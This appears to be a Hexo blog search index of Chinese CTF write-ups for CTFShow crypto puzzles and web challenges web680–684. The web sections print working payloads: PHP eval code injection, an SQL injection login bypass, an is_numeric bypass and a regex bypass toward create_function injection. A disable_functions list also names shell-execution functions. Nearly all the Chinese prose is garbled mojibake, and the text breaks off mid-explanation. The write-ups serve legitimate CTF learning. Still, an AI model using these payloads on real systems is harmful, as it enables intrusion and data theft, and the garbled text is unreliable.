<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>CTFShow-CRYPTO</title>
    <url>/2021/10/14/CTFShow-CRYPTO/</url>
    <content><![CDATA[<p>CTFShow CRYPTO</p>
<h2 id="å¯†ç å­¦ç­¾åˆ°"><a href="#å¯†ç å­¦ç­¾åˆ°" class="headerlink" title="å¯†ç å­¦ç­¾åˆ°"></a>å¯†ç å­¦ç­¾åˆ°</h2><p>}wohs.ftc{galf</p>
<p>è¿™ä¸€çœ‹ï¼Œæ˜æ˜¾çš„å€’å™äº†å˜›ï¼æ‰‹åŠ¨è¿”å›æ¥æˆ–è€…å†™ä¸ªè„šæœ¬ä¹Ÿå¯:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="built_in">str</span> = <span class="string">&quot;&#125;wohs.ftc&#123;galf&quot;</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">str</span>[::-<span class="number">1</span>])</span><br><span class="line"><span class="comment"># ç»“æœ:</span></span><br><span class="line">flag&#123;ctf.show&#125;</span><br></pre></td></tr></table></figure>

<h2 id="crypto2"><a href="#crypto2" class="headerlink" title="crypto2"></a>crypto2</h2><p>jsfuck</p>
<p>ç›´æ¥å¤åˆ¶åˆ° æ§åˆ¶å°å›è½¦å³å¯å‡ºç»“æœï¼</p>
<p><img src="/2021/10/14/CTFShow-CRYPTO/crypto2.png"></p>
<h2 id="crypto3"><a href="#crypto3" class="headerlink" title="crypto3"></a>crypto3</h2><p>æ–¹æ³•å’Œä¸Šä¸€é¢˜ä¸€æ ·ï¼Œä½†æ˜¯éœ€è¦æŠŠæ‰“å¼€çš„æ–‡ä»¶ä¿å­˜åˆ°æœ¬åœ°æŸ¥çœ‹ï¼Œç½‘é¡µæ˜¾ç¤ºä¸ºä¹±ç </p>
<p><img src="/2021/10/14/CTFShow-CRYPTO/crypto3.png"></p>
<h2 id="crypto4"><a href="#crypto4" class="headerlink" title="crypto4"></a>crypto4</h2><p>é¢˜ç›®:</p>
<p>p=447685307 q=2037 e=17</p>
<p>æäº¤flag{d}å³å¯</p>
<h3 id="æ–¹æ³•ä¸€ï¼š"><a href="#æ–¹æ³•ä¸€ï¼š" class="headerlink" title="æ–¹æ³•ä¸€ï¼š"></a>æ–¹æ³•ä¸€ï¼š</h3><p>python:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"></span><br><span class="line">p = <span class="number">447685307</span></span><br><span class="line">q = <span class="number">2037</span></span><br><span class="line">e = <span class="number">17</span></span><br><span class="line"></span><br><span class="line">phi_n = (p-<span class="number">1</span>)*(q-<span class="number">1</span>)</span><br><span class="line">d = gmpy2.invert(e, phi_n)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;p=%s\nq=%s\ne=%s&quot;</span> %(p,q,e))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;d=%s&quot;</span> %(d))</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>ç»“æœ:</p>
<p><img src="/2021/10/14/CTFShow-CRYPTO/crypto4.png"></p>
<h3 id="æ–¹æ³•äºŒï¼š"><a href="#æ–¹æ³•äºŒï¼š" class="headerlink" title="æ–¹æ³•äºŒï¼š"></a>æ–¹æ³•äºŒï¼š</h3><p>RSA - Tool</p>
<p><img src="/2021/10/14/CTFShow-CRYPTO/crypto4_2.png"></p>
<h2 id="crypto5"><a href="#crypto5" class="headerlink" title="crypto5"></a>crypto5</h2><p>é¢˜ç›®:</p>
<p>p=447685307 q=2037 e=17 c=704796792</p>
<p>æäº¤flag{m}</p>
<h3 id="python"><a href="#python" class="headerlink" title="python"></a><strong>python</strong></h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"></span><br><span class="line">p = <span class="number">447685307</span></span><br><span class="line">q = <span class="number">2037</span></span><br><span class="line">e = <span class="number">17</span></span><br><span class="line">c = <span class="number">704796792</span></span><br><span class="line"></span><br><span class="line">phi_n = (p-<span class="number">1</span>)*(q-<span class="number">1</span>)</span><br><span class="line">n = p * q</span><br><span class="line">d = gmpy2.invert(e, phi_n)</span><br><span class="line">m = <span class="built_in">pow</span>(c, d, n)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;p=%s\nq=%s\ne=%s\nc=%s\nd=%s\nn=%s&quot;</span> %(p,q,e,c,d,n))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;flag&#123;%s&#125;&quot;</span> %(m))</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><strong>ç»“æœ</strong>:</p>
<p><img src="/2021/10/14/CTFShow-CRYPTO/crypto5.png"></p>
<h2 id="crypto6"><a href="#crypto6" class="headerlink" title="crypto6"></a>crypto6</h2><p>é¢˜ç›®:</p>
<p>å¯†é’¥ä¸º åŠ å¯†æ–¹å¼ åç§°ï¼ŒåŒºåˆ†å¤§å°å†™</p>
<p><img src="/2021/10/14/CTFShow-CRYPTO/crypto6.png"></p>
<p>U2Fsd å¼€å¤´çš„ä¸º Rabbit åŠ å¯†ï¼Œé¢˜ç›®è¯´äº† å¯†é’¥ä¸º åŠ å¯†æ–¹å¼åç§°åˆ™ï¼š Rabbit</p>
<p><img src="/2021/10/14/CTFShow-CRYPTO/crypto6_2.png"></p>
<h2 id="crypto7"><a href="#crypto7" class="headerlink" title="crypto7"></a>crypto7</h2><p><img src="/2021/10/14/CTFShow-CRYPTO/crypto7.png"></p>
<p>Ook? è¿˜æœ‰è¿™åŠ å¯†</p>
<p><a href="https://www.splitbrain.org/services/ook">https://www.splitbrain.org/services/ook</a> åœ¨çº¿è§£å¯†</p>
<h2 id="crypto8"><a href="#crypto8" class="headerlink" title="crypto8"></a>crypto8</h2><p>Brainfuck åŠ å¯†</p>
<p><a href="https://www.splitbrain.org/services/ook">https://www.splitbrain.org/services/ook</a> åœ¨çº¿è§£å¯†</p>
<h2 id="crypto9"><a href="#crypto9" class="headerlink" title="crypto9"></a>crypto9</h2><p>ä¸‹è½½æ˜¯ä¸€ä¸ªå‹ç¼©åŒ…ï¼Œä½†æ˜¯æ²¡æœ‰è§£ç å¯†ç ï¼Œå¯ä»¥ä½¿ç”¨ Ziperello ç ´è§£</p>
<p><img src="/2021/10/14/CTFShow-CRYPTO/crypto9.png"></p>
<p>å¾—åˆ°å¯†ç  4132:</p>
<p>æ ¹æ®æ–‡ä»¶å¤¹çš„åç§°ï¼š serpent å¯çŸ¥æ˜¯è¿™ç§åŠ å¯†æ–¹å¼ã€‚åœ¨çº¿ç½‘ç«™è§£å¯†:</p>
<p><a href="http://serpent.online-domain-tools.com/">Serpent Encryption â€“ Easily encrypt or decrypt strings or files (online-domain-tools.com)</a></p>
<p><img src="/2021/10/14/CTFShow-CRYPTO/crypto9_2.png"></p>
<h2 id="crypto10"><a href="#crypto10" class="headerlink" title="crypto10"></a>crypto10</h2><p><a href="http://www.mxcz.net/tools/quotedprintable.aspx">http://www.mxcz.net/tools/quotedprintable.aspx</a></p>
<p>å¾—åˆ°: ç”¨ä½ é‚£ç«çƒ­çš„å˜´å”‡è®©æˆ‘åœ¨åˆå¤œé‡Œæ— å°½çš„é”€é­‚</p>
<p>flag{ç”¨ä½ é‚£ç«çƒ­çš„å˜´å”‡è®©æˆ‘åœ¨åˆå¤œé‡Œæ— å°½çš„é”€é­‚}</p>
<h2 id="crypto11"><a href="#crypto11" class="headerlink" title="crypto11"></a>crypto11</h2><p><a href="https://www.somd5.com/">https://www.somd5.com/</a></p>
<p>å¾—åˆ° ctf</p>
<p>flag{ctf}</p>
<h2 id="crypto0"><a href="#crypto0" class="headerlink" title="crypto0"></a>crypto0</h2><p>gmbh{ifmmp_dug}</p>
<p><a href="https://www.qqxiuzi.cn/bianma/kaisamima.php">å‡¯æ’’å¯†ç åœ¨çº¿åŠ å¯†è§£å¯† - åƒåƒç§€å­— (qqxiuzi.cn)</a></p>
<p>å‡¯æ’’å¯†ç  ä½ç§» 1 ä½ï¼š</p>
<p>flag{hello_ctf}</p>
<h2 id="crypto12"><a href="#crypto12" class="headerlink" title="crypto12"></a>crypto12</h2><p>uozt{Zgyzhv_xlwv_uiln_xguhsld}</p>
<p>åŸƒç‰¹å·´ä»€ç :</p>
<p><a href="https://wtool.com.cn/atbash.html">åŸƒç‰¹å·´ä»€ç  - Atbash Cipher - åœ¨çº¿å·¥å…·ç½‘ (wtool.com.cn)</a></p>
<p>flag{Atbase_code_from_ctfshow} (æ³¨æ„å¤§å°å†™)</p>
<h2 id="crypto13"><a href="#crypto13" class="headerlink" title="crypto13"></a>crypto13</h2><p>ä¸‹è½½ ä¸‹æ¥ base.txt baseå®¶æ—æ··åˆã€‚ç½‘ä¸Šæœ‰è„šæœ¬:</p>
<p>flag{b4Se_Fami1y_Is_FUn}</p>
<h2 id="crypto14"><a href="#crypto14" class="headerlink" title="crypto14"></a>crypto14</h2>]]></content>
      <categories>
        <category>CTFç¬”è®°</category>
      </categories>
  </entry>
  <entry>
    <title>CTFShow-å¤§èµ›åŸé¢˜</title>
    <url>/2022/02/04/CTFShow-%E5%A4%A7%E8%B5%9B%E5%8E%9F%E9%A2%98/</url>
    <content><![CDATA[<h2 id="CTFShow-å¤§èµ›åŸé¢˜"><a href="#CTFShow-å¤§èµ›åŸé¢˜" class="headerlink" title="CTFShow å¤§èµ›åŸé¢˜"></a>CTFShow å¤§èµ›åŸé¢˜</h2><span id="more"></span>

<h2 id="web680"><a href="#web680" class="headerlink" title="web680"></a>web680</h2><p>æ‰“å¼€å¦‚å›¾æ‰€ç¤º:</p>
<p><img src="/2022/02/04/CTFShow-%E5%A4%A7%E8%B5%9B%E5%8E%9F%E9%A2%98/web680.png"></p>
<p>å¦‚å›¾æ‰€ç¤ºï¼šéœ€è¦postæäº¤ code=xxxx</p>
<p>æäº¤:</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">code=phpinfo();	</span><br></pre></td></tr></table></figure>

<p>å¾—åˆ°äº† phpinfoä¿¡æ¯,æŸ¥çœ‹å…³é”®ä¿¡æ¯:</p>
<ul>
<li>æ²¡æœ‰ç›´æ¥flag</li>
<li>allow_url_fopen,allow_url_include ä¸ºOn</li>
<li>disable_functions :ç¦æ­¢äº†å¸¸è§çš„å‡½æ•°ã€‚</li>
</ul>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">assert,system,passthru,exec,pcntl_exec,shell_exec,popen,proc_open,pcntl_alarm,pcntl_fork,pcntl_waitpid,pcntl_wait,pcntl_wifexited,pcntl_wifstoped,pcntl_wifsignaled,pcntl_wexitstatus,pcntl_wtermsig,pcntl_wstopsig,pcntl_signal,pcntl_signal_dispatch,pcntl_get_last_error,pcntl_strerror,fopen,file_get_contents,fread,file,readfile,opendir,readdir,closedir,rewinddir</span><br></pre></td></tr></table></figure>

<p>æˆ‘ä»¬éœ€è¦Index.phpçš„æºä»£ç :</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">code=highlight_file(<span class="string">&quot;index.php&quot;</span>);</span><br></pre></td></tr></table></figure>

<p><img src="/2022/02/04/CTFShow-%E5%A4%A7%E8%B5%9B%E5%8E%9F%E9%A2%98/web680_1.png"></p>
<p>å¦‚å›¾æ‰€ç¤ºå¯å¾—æºç ï¼Œå°±æ˜¯ä¸€ä¸ª eval å‡½æ•°ã€‚æ—¢ç„¶å¦‚æ­¤ä½•å¿…ä¸ç›´æ¥ highlight_file(â€œflag.phpâ€)å‘¢ï¼Ÿæƒ³æ³•æ˜¯å¯¹çš„ï¼Œä½†æ˜¯æ²¡æœ‰flag.phpæ–‡ä»¶ã€‚</p>
<p>æ¥ç€æˆ‘æƒ³è¯•è¯•é‡å®šå‘å†™ä¸ªé©¬è¿›å»ï¼Œä½†æ˜¯ä¸è¡Œã€‚</p>
<p>åˆ°äº†è¿™é‡Œï¼Œæˆ‘ä»¬æ€¥éœ€çŸ¥é“å½“å‰ç½‘ç«™ç›®å½•ä¸‹æœ‰ä½•æ–‡ä»¶ã€‚</p>
<p>å½“å°è¯•ä½¿ç”¨ scandir()å‡½æ•°,å‘ç°å¯è¡Œ.</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">code=var_dump(scandir(<span class="string">&#x27;./&#x27;</span>));</span><br><span class="line">code=var_dump(scandir(<span class="string">&quot;glob://*&quot;</span>)); <span class="comment">// å‡å¯ï¼Œå¤šé€‰ä¸€</span></span><br><span class="line">code=<span class="variable">$a</span>=<span class="keyword">new</span> <span class="built_in">DirectoryIterator</span>(<span class="string">&quot;glob:///*&quot;</span>); <span class="comment">// web72çš„æ–¹æ³•ã€‚</span></span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$a</span> <span class="keyword">as</span> <span class="variable">$f</span>)&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$f</span>.<span class="string">&quot;    &quot;</span> ;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><a href="https://www.ohhhhhh.top/2021/07/22/CTFShow-Web%E7%AC%94%E8%AE%B0/#web72%E2%80%94%E2%80%94%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C">https://www.ohhhhhh.top/2021/07/22/CTFShow-Web%E7%AC%94%E8%AE%B0/#web72%E2%80%94%E2%80%94%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C</a></p>
<p><img src="/2022/02/04/CTFShow-%E5%A4%A7%E8%B5%9B%E5%8E%9F%E9%A2%98/web680_2.png"></p>
<p>å¦‚å›¾æ‰€ç¤ºï¼Œæ˜¾ç¤ºå‡ºäº†å½“å‰ç›®å½•ä¸‹çš„æ–‡ä»¶ï¼Œå…¶ä¸­æœ‰ <strong>secret_you_never_know</strong> æ–‡ä»¶ï¼Œé‚£ä¹ˆåªè¦è¯»å–æ­¤æ–‡ä»¶é‚£å°±å…«ä¹ä¸ç¦»åäº†ã€‚</p>
<h3 id="æ–¹æ³•ä¸€ï¼š"><a href="#æ–¹æ³•ä¸€ï¼š" class="headerlink" title="æ–¹æ³•ä¸€ï¼š"></a>æ–¹æ³•ä¸€ï¼š</h3><p>æ—¢ç„¶secret_you_never_knowæ­¤æ–‡ä»¶åœ¨ç½‘ç«™ç›®å½•ä¸‹ï¼Œç›´æ¥è®¿é—®å³å¯ä¸‹è½½:</p>
<p><a href="http://e3ea6102-34cd-4546-9cab-7311d786b921.challenge.ctf.show/secret_you_never_know">http://e3ea6102-34cd-4546-9cab-7311d786b921.challenge.ctf.show/secret_you_never_know</a></p>
<p><img src="/2022/02/04/CTFShow-%E5%A4%A7%E8%B5%9B%E5%8E%9F%E9%A2%98/web680_3.png"></p>
<p>å¦‚å›¾æ‰€ç¤ºï¼Œå°†å…¶ä¸‹è½½ä¸‹æ¥ï¼Œæ‰“å¼€ä¸ºflagã€‚</p>
<h3 id="æ–¹æ³•äºŒï¼š"><a href="#æ–¹æ³•äºŒï¼š" class="headerlink" title="æ–¹æ³•äºŒï¼š"></a>æ–¹æ³•äºŒï¼š</h3><p>ä¸ä¸‹è½½ï¼Œç›´æ¥ highlight_file()å³å¯</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">code=highlight_file(<span class="string">&quot;secret_you_never_know&quot;</span>);</span><br><span class="line">code=show_source(<span class="string">&quot;secret_you_never_know&quot;</span>);</span><br><span class="line">code=<span class="keyword">include</span>(<span class="string">&quot;secret_you_never_know&quot;</span>);<span class="comment">// å‡å¯ï¼Œå¤šé€‰ä¸€ã€‚</span></span><br></pre></td></tr></table></figure>

<p><img src="/2022/02/04/CTFShow-%E5%A4%A7%E8%B5%9B%E5%8E%9F%E9%A2%98/web680_4.png"></p>
<p>å¦‚å›¾æ‰€ç¤ºæœ‰ flagï¼Œhighlight_file()èƒ½æ˜¾ç¤ºéphpæ–‡ä»¶ã€‚</p>
<p>æ›´å¤šæ–¹æ³•æœ‰å¾…ç ”ç©¶â€¦â€¦</p>
<h2 id="web681"><a href="#web681" class="headerlink" title="web681"></a>web681</h2><p>æ‰“å¼€å¦‚å›¾æ‰€ç¤º:</p>
<p><img src="/2022/02/04/CTFShow-%E5%A4%A7%E8%B5%9B%E5%8E%9F%E9%A2%98/web681.png"></p>
<p>ç‚¹å‡»ç™»é™†ï¼Œéšä¾¿ç™»é™†éƒ½ä¸ºç»¿å¸½å­</p>
<p><img src="/2022/02/04/CTFShow-%E5%A4%A7%E8%B5%9B%E5%8E%9F%E9%A2%98/web681_1.png"></p>
<h3 id="ç›®å½•æ‰«æ"><a href="#ç›®å½•æ‰«æ" class="headerlink" title="ç›®å½•æ‰«æ"></a>ç›®å½•æ‰«æ</h3><p><img src="/2022/02/04/CTFShow-%E5%A4%A7%E8%B5%9B%E5%8E%9F%E9%A2%98/web681_2.png"></p>
<p>å¦‚ä¸Šå›¾æ‰€ç¤ºå‘ç°äº† .svn æ³„éœ²ï¼Œè®¿é—®å°†å…¶ä¸‹è½½ä¸‹æ¥</p>
<p><img src="/2022/02/04/CTFShow-%E5%A4%A7%E8%B5%9B%E5%8E%9F%E9%A2%98/web681_3.png"></p>
<p><img src="/2022/02/04/CTFShow-%E5%A4%A7%E8%B5%9B%E5%8E%9F%E9%A2%98/web681_4.png"></p>
<p>check.php</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2021-09-24 14:58:16</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2021-09-24 16:04:49</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;common.php&quot;</span>;</span><br><span class="line"></span><br><span class="line">session_start();</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&quot;name&quot;</span>]))&#123;</span><br><span class="line">  <span class="variable">$name</span> = str_replace(<span class="string">&quot;&#x27;&quot;</span>, <span class="string">&quot;&quot;</span>, trim(waf(<span class="variable">$_POST</span>[<span class="string">&quot;name&quot;</span>])));</span><br><span class="line">  <span class="keyword">if</span> (strlen(<span class="variable">$name</span>) &gt; <span class="number">11</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span>(<span class="string">&quot;&lt;script&gt;alert(&#x27;name too long&#x27;)&lt;/script&gt;&quot;</span>);</span><br><span class="line">  &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="variable">$sql</span> = <span class="string">&quot;select count(*) from ctfshow_users where username = &#x27;<span class="subst">$name</span>&#x27; or nickname = &#x27;<span class="subst">$name</span>&#x27;&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$sql</span>;</span><br><span class="line">    <span class="variable">$db</span> = <span class="keyword">new</span> db();</span><br><span class="line">    <span class="variable">$result</span> = <span class="variable">$db</span>-&gt;select_one_array(<span class="variable">$sql</span>);</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$result</span>[<span class="number">0</span>])&#123;</span><br><span class="line">      <span class="variable">$_SESSION</span>[<span class="string">&#x27;hat&#x27;</span>] = <span class="string">&#x27;black&#x27;</span>;</span><br><span class="line">      <span class="keyword">echo</span> <span class="string">&#x27;good job&#x27;</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="variable">$_SESSION</span>[<span class="string">&#x27;hat&#x27;</span>] = <span class="string">&#x27;green&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    header(<span class="string">&quot;Location: index.php&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>åˆ†æï¼š</p>
<ul>
<li>å…¶ä¸­æœ‰ä¸€å¥ sql è¯­å¥ï¼Œå¾ˆæ˜æ˜¾è€ƒå¯Ÿsqlæ³¨å…¥ã€‚</li>
<li>waf()å¯çŸ¥æœ‰è¿‡æ»¤ã€‚</li>
<li>str_replace() å°†å•å¼•å·è¿‡æ»¤äº†ã€‚</li>
<li>å¦‚æœPOSTæäº¤çš„nameé•¿åº¦è¶…è¿‡11å°†å¼¹å‡º name too long.</li>
<li>è¦é»‘å¸½å­æ‰å¯¹ã€‚è™½è¯´ç»¿ç»¿æ›´å¥åº·ğŸ˜‚,ç´§æ¥ç€ç”µè„‘å¯åŠ¨Kali,å±…ç„¶ç»¿å±äº†ï¼ŒçœŸæ˜¯ç»¿çš„å‘æ…Œï¼ï¼ï¼</li>
<li>é‚£ä¹ˆè¦sqlæ³¨å…¥ï¼Œä¸”é•¿åº¦ä¸èƒ½è¶…è¿‡ 11ï¼Œå¦åˆ™å¤±è´¥ã€‚</li>
</ul>
<p>æœ€ç»ˆæµ‹è¯•äº†å¦‚ä¸‹:</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">name=or/**/1=1#\</span><br></pre></td></tr></table></figure>

<p><img src="/2022/02/04/CTFShow-%E5%A4%A7%E8%B5%9B%E5%8E%9F%E9%A2%98/web681_5.png"></p>
<p>å¦‚å›¾æ‰€ç¤ºå¾—åˆ°äº† flag.</p>
<h2 id="web682"><a href="#web682" class="headerlink" title="web682"></a>web682</h2><p>å…ˆæ”¾ç€</p>
<h2 id="web683"><a href="#web683" class="headerlink" title="web683"></a>web683</h2><p>æºç :</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2021-09-24 17:34:28</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2021-09-24 20:32:56</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line">   error_reporting(<span class="number">0</span>);</span><br><span class="line">   <span class="keyword">include</span> <span class="string">&quot;flag.php&quot;</span>;</span><br><span class="line">   <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;ç§€&#x27;</span>]))&#123;</span><br><span class="line">       <span class="keyword">if</span>(!is_numeric(<span class="variable">$_GET</span>[<span class="string">&#x27;ç§€&#x27;</span>]))&#123;</span><br><span class="line">          <span class="keyword">die</span>(<span class="string">&#x27;å¿…é¡»æ˜¯æ•°å­—&#x27;</span>);</span><br><span class="line">       &#125;<span class="keyword">else</span> <span class="keyword">if</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;ç§€&#x27;</span>] &lt; <span class="number">60</span> * <span class="number">60</span> * <span class="number">24</span> * <span class="number">30</span> * <span class="number">2</span>)&#123;</span><br><span class="line">          <span class="keyword">die</span>(<span class="string">&#x27;ä½ å¤ªçŸ­äº†&#x27;</span>);</span><br><span class="line">       &#125;<span class="keyword">else</span> <span class="keyword">if</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;ç§€&#x27;</span>] &gt; <span class="number">60</span> * <span class="number">60</span> * <span class="number">24</span> * <span class="number">30</span> * <span class="number">3</span>)&#123;</span><br><span class="line">           <span class="keyword">die</span>(<span class="string">&#x27;ä½ å¤ªé•¿äº†&#x27;</span>);</span><br><span class="line">       &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">           sleep((<span class="keyword">int</span>)<span class="variable">$_GET</span>[<span class="string">&#x27;ç§€&#x27;</span>]);</span><br><span class="line">           <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">       &#125;</span><br><span class="line">       <span class="keyword">echo</span> <span class="string">&#x27;&lt;hr&gt;&#x27;</span>;</span><br><span class="line">   &#125;</span><br><span class="line">   highlight_file(<span class="keyword">__FILE__</span>);</span><br></pre></td></tr></table></figure>

<p>åˆ†æï¼š</p>
<ul>
<li>is_numeric()å‡½æ•°æ£€æµ‹å˜é‡æ˜¯å¦ä¸ºæ•°å­—æˆ–è€…æ•°å­—å­—ç¬¦ä¸²ã€‚</li>
<li>è¦æ±‚æ•°å­—å¤§äº 60 * 60 * 24 * 30 * 2 ä¸” sleepå¤šå°‘ç§’ã€‚</li>
<li>ä¸€èˆ¬çœ‹åˆ° is_numeric()å‡½æ•°å°±ä¼šè”æƒ³åˆ° ç§‘å­¦è®¡æ•°æ³• e.ä¸€èˆ¬æƒ…å†µå…«ä¹ä¸ç¦»åå°±èƒ½æˆåŠŸã€‚</li>
</ul>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?ç§€=<span class="number">0.6e7</span> <span class="comment">//0.6 é¿å…äº†æ•°å­—å¤ªå¤§ï¼Œä¸ç„¶sleepä¼šç­‰å¾ˆä¹…ã€‚</span></span><br></pre></td></tr></table></figure>

<p><img src="/2022/02/04/CTFShow-%E5%A4%A7%E8%B5%9B%E5%8E%9F%E9%A2%98/web683.png"></p>
<p>å¦‚å›¾æ‰€ç¤ºå¾—åˆ°äº†flag.</p>
<p><strong>å°èŠ‚</strong></p>
<ul>
<li>is_numeric()å‡½æ•°ç‰¹æ€§ã€‚</li>
</ul>
<h2 id="web684"><a href="#web684" class="headerlink" title="web684"></a>web684</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$action</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;action&#x27;</span>] ?? <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="variable">$arg</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;arg&#x27;</span>] ?? <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">&#x27;/^[a-z0-9_]*$/isD&#x27;</span>, <span class="variable">$action</span>)) &#123;</span><br><span class="line">    show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="variable">$action</span>(<span class="string">&#x27;&#x27;</span>, <span class="variable">$arg</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>åˆ†æ:</p>
<ul>
<li>åœ¨ php7 ä¸­æ–°å¢äº†è¿ç®—ç¬¦ ??, å…¶åŠŸèƒ½ä¸ä¸‰æœ¨è¿ç®—ç¬¦æ˜¯ä¸€æ ·çš„?:</li>
<li>æ­£åˆ™è¡¨è¾¾å¼ åŒ¹é… å­—æ¯æ•°å­—ä¸‹åˆ’çº¿ã€‚</li>
<li>i ä¸åŒºåˆ†å¤§å°å†™ã€‚</li>
<li>s åŒ¹é…ä»»ä½•ä¸å¯è§å­—ç¬¦ï¼ŒåŒ…æ‹¬ç©ºæ ¼ï¼Œåˆ¶è¡¨ç¬¦ï¼Œæ¢é¡µç¬¦ã€‚</li>
<li>D å¦‚æœè®¾å®šäº†æ­¤ä¿®æ­£ç¬¦ï¼Œæ¨¡å¼ä¸­çš„ç¾å…ƒå…ƒå­—ç¬¦ä»…åŒ¹é…ç›®æ ‡å­—ç¬¦ä¸²çš„ç»“å°¾ã€‚</li>
<li>$action() æ­¤å¤„åœ¨å°†å˜é‡å½“ä½œå‡½æ•°æ‰§è¡Œã€‚</li>
<li>%09,%0a,%00,%5c å‡å¯ç»•è¿‡æ­£åˆ™,æ­¤å¤„é€‰æ‹© %5cæ‰èƒ½æˆåŠŸã€‚</li>
</ul>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">/?action=%<span class="number">0</span>asystem</span><br></pre></td></tr></table></figure>

<p><img src="/2022/02/04/CTFShow-%E5%A4%A7%E8%B5%9B%E5%8E%9F%E9%A2%98/web684.png"></p>
<p>å¦‚å›¾æ‰€ç¤ºï¼Œçš„ç¡®ç»•è¿‡äº†æ­£åˆ™åŒ¹é…ï¼Œä½†æ˜¯å½“æ‰§è¡Œåˆ°ç¬¬å…«è¡Œ $action()æ—¶æŠ¥é”™äº†:Call to undefined function system() in /var/www/html/index.php:8 æ„æ€æ˜¯æ²¡æœ‰å®šä¹‰ systemè¿™ä¸ªå‡½æ•°ã€‚ä»è¿™é‡Œå‘Šè¯‰æˆ‘ä»¬è¦è‡ªå·±å†™ä¸€ä¸ªå‡½æ•°æ¥è¿è¡Œã€‚</p>
<ul>
<li>ä½¿ç”¨ create_function()ï¼šæ­¤å‡½æ•°ç”¨æ¥åˆ›å»ºåŒ¿åå‡½æ•°ã€‚</li>
<li>create_functionç›¸å½“äº</li>
</ul>
